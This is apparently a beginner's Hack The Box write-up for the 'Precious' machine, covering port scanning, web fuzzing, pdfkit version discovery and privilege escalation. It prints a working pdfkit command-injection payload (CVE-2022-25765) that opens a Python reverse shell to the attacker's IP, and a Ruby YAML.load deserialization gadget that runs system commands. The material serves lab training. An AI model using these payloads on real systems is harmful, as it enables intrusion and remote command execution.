### Hello Hackers,
this is the first machine I solve on hack the box AND my first writeup, so any feedback would be much appreciated [my linkedin]( https://www.linkedin.com/in/basmatalaat/)

let's begin ;)
# Nmap

first I pinged the ip to see if it's up

![image](https://user-images.githubusercontent.com/99322823/224144051-af782f7f-322b-40be-9ce3-a72fc8a23abc.png)

it's good to go, now we'll start with an nmap scan of the ip:

//`export ip=10.10.11.189` 

//defining a variable in the terminal with the machine IP so I don't have to type it each time, instead just wtite $ip (you can skip this step)

`sudo nmap -sV -sC -oN nmap.txt $ip`

`-oN` → saving the output to a file, in our case nmap.txt

`-sV` → service/version info detection

`-sC` → performs a script scan using the default set of scripts
 
#### the results:
 ```
 cat nmap.txt                              
# Nmap 7.93 scan initiated Wed Feb 15 19:58:40 2023 as: nmap -sV -sC -vv -oN nmap 10.10.11.189
Nmap scan report for 10.10.11.189
Host is up, received echo-reply ttl 63 (0.083s latency).
Scanned at 2023-02-15 19:58:53 EST for 13s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEAPxqUubE88njHItE+mjeWJXOLu5reIBmQHCYh2ETYO5zatgel+LjcYdgaa4KLFyw8CfDbRL9swlmGTaf4iUbao4jD73HV9/Vrnby7zP04OH3U/wVbAKbPJrjnva/czuuV6uNz4SVA3qk0bp6wOrxQFzCn5OvY3FTcceH1jrjrJmUKpGZJBZZO6cp0HkZWs/eQi8F7anVoMDKiiuP0VX28q/yR1AFB4vR5ej8iV/X73z3GOs3ZckQMhOiBmu1FF77c7VW1zqln480/AbvHJDULtRdZ5xrYH1nFynnPi6+VU/PIfVMpHbYu7t0mEFeI5HxMPNUvtYRRDC14jEtH6RpZxd7PhwYiBctiybZbonM5UP0lP85OuMMPcSMll65+8hzMMY2aejjHTYqgzd7M6HxcEMrJW7n7s5eCJqMoUXkL8RSBEQSmMUV8iWzHW0XkVUfYT5Ko6Xsnb+DiiLvFNUlFwO6hWz2WG8rlZ3voQ/gv8BLVCU1ziaVGerd61PODck=
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFScv6lLa14Uczimjt1W7qyH6OvXIyJGrznL1JXzgVFdABwi/oWWxUzEvwP5OMki1SW9QKX7kKVznWgFNOp815Y=
|   256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH+JGiTFGOgn/iJUoLhZeybUvKeADIlm0fHnP/oZ66Qb
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 15 19:59:06 2023 -- 1 IP address (1 host up) scanned in 26.16 seconds
```

we find 2 open ports:
-port 22 running ssh 
-port 80 running the Nginx web server version 1.18.0

since we have a web server running we'll use `nikto`, which is a web server scanner that identifies vulnerabilities and security issues in the web server. 
 
 `nikto -h $ip`
 
 `-h` → specify host/ip
 ```
 nikto -h $ip                         
- Nikto v2.1.6/2.1.5
+ Target Host: precious.htb
+ Target Port: 80
+ GET Retrieved x-powered-by header: Phusion Passenger(R) 6.0.15
+ GET Uncommon header 'x-runtime' found, with contents: Ruby
+ GET Uncommon header 'x-cascade' found, with contents: pass
```
researched the `X-Runtime` header and it basically reveals the time an application takes to serve a request
but it didn't make sense why its value was Ruby in the nikto scan, so I researched more and found this:

![image](https://user-images.githubusercontent.com/99322823/224205644-0796ca97-49f9-442f-997d-b01853789096.png)

I figured the server probably runs Ruby, so I kept it in mind.

# Fuzzing 
we'll use both `gobuster` and `ffuf`

## Gobuster
```
gobuster dir -u http://$ip:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.189:80/
[+] Method:                  c
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/03/09 21:44:49 Starting gobuster in directory enumeration mode
===============================================================

Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.11.189:80/693bdcf7-774c-4b09-afba-d9b4a88456e6 => 400 (Length: 157). To continue please exclude the status code or the length
```

nothing.
## Ffuf
```ffuf -u http://$ip/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt```

same with ffuf

# Browsing the Website
port 80 redirects us to precious.htb 

Let's add that in /etc/hosts file

```
`sudo nano /etc/hosts`

127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.10.11.189 precious.htb
```

![image](https://user-images.githubusercontent.com/99322823/224211714-273c5c37-fb19-444f-9cb6-5bc831b353d2.png)

trying `http://google.com/`
![image](https://user-images.githubusercontent.com/99322823/224212183-39999715-bc4f-4744-a44a-84b94ec24a84.png)

so we'll fire up our local server

![image](https://user-images.githubusercontent.com/99322823/224215304-56acb3e5-8cbb-48ba-93a9-7997cef82afd.png)

and try it again 
`http://<your ip>:8000/`

//to know your ip type `ifconfig` and you'll find it here

![image](https://user-images.githubusercontent.com/99322823/224216043-4e42c23e-338e-4a07-9b0d-d6ecd6acec23.png)


![image](https://user-images.githubusercontent.com/99322823/224215549-45f0f966-9b44-4bd6-a3f5-e97f20e1f1b9.png)


it downloaded the pdf

how it looks:

![image](https://user-images.githubusercontent.com/99322823/224413307-d011c401-5923-47c2-9f45-ebf20a1af275.png)

nothing out of the norm

let's examine the metadata with `exiftool`:

![image](https://user-images.githubusercontent.com/99322823/224216511-f91436b8-5f29-432e-90ee-e475fec1c342.png)

what's interesting to us here is it's made with pdfkit
googling 'pdfkit v0.8.6 exploit' we find CVE-2022-25765 whcih basically
https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795

our payload:
```
http://10.10.14.222:8000/?name={'%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.222",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`'}
```

# Gaining Access

![image](https://user-images.githubusercontent.com/99322823/224590015-16362ac1-2df3-4207-bd76-a63419184b3d.png)

the flag is in henry's home directory 

![image](https://user-images.githubusercontent.com/99322823/224590553-9b0fe4e1-e91d-422c-8c8b-0a88e586ffdf.png)

we can't acces it as ruby 

![image](https://user-images.githubusercontent.com/99322823/224590855-1fb9ca99-4be9-415f-a654-a7cc561736be.png)

try ssh-ing into henry's

![image](https://user-images.githubusercontent.com/99322823/224591089-aa47e96b-e2fe-43e2-83ba-b0aa4e06e18b.png)


and we're in as henry !
try to cat user.txt again and i

![image](https://user-images.githubusercontent.com/99322823/224591640-8315ab37-3b4c-4c46-9c4c-dbac613531dc.png)

we got our first flag !

# Priv Escalation

`sudo -l`

![image](https://user-images.githubusercontent.com/99322823/224591737-1fe00cf7-55f9-4c82-a09b-a9f7b511eca3.png)


![image](https://user-images.githubusercontent.com/99322823/224592218-2942f845-5fb6-4ca5-a514-0693af09a02f.png)


![image](https://user-images.githubusercontent.com/99322823/224594774-224f228b-4b3e-486e-aeba-998605151d87.png)



so it turned it's really using ruby
googling : **yaml.load exploit ruby**

![image](https://user-images.githubusercontent.com/99322823/224598469-c35034cc-5570-4fe0-9437-88f2a82d3ee0.png)


we find a repo with a payload exploiting the `yaml.load` function [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md)
and [here](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/?ref=the-random-adventure-that-is-life-ratil)


```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

![image](https://user-images.githubusercontent.com/99322823/224806047-7e7674b6-4095-499d-8cd3-818e82caf10c.png)

![image](https://user-images.githubusercontent.com/99322823/224808584-9d1c66f5-1f56-4ee4-8a3f-46fd12fe6263.png)

![image](https://user-images.githubusercontent.com/99322823/224808658-da3534ee-38e4-46c2-8154-ee954d0ab6cb.png)

![image](https://user-images.githubusercontent.com/99322823/224808685-a2f58416-33b5-4cd7-b50c-a00ec5fa38b5.png)

